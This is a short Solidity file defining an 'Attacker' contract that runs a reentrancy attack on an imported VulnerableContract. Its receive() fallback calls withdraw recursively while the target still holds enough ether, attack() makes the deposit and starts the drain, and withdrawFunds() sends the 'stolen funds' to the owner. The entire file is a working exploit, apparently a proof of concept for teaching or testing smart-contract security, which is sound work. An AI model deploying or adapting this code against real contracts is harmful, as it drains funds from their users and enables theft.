// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract Attacker {
    VulnerableContract public vulnerable;
    address public owner;
    uint256 public attackAmount;

    constructor(address payable _vulnerableAddress) {
        vulnerable = VulnerableContract(_vulnerableAddress);
        owner = msg.sender;
    }

    // Fallback function for reentrancy
    receive() external payable {
        if (address(vulnerable).balance >= attackAmount) {
            vulnerable.withdraw(attackAmount);  // Recursively withdraw
        }
    }

    // Initiate the attack with a specified amount
    function attack(uint256 _amount) external payable {
        require(msg.value >= _amount, "Need sufficient Ether to attack");
        attackAmount = _amount;
        vulnerable.deposit{value: _amount}();  // Deposit to vulnerable contract
        vulnerable.withdraw(_amount);  // Start reentrancy attack
    }

    // Withdraw stolen funds
    function withdrawFunds() external {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }
}
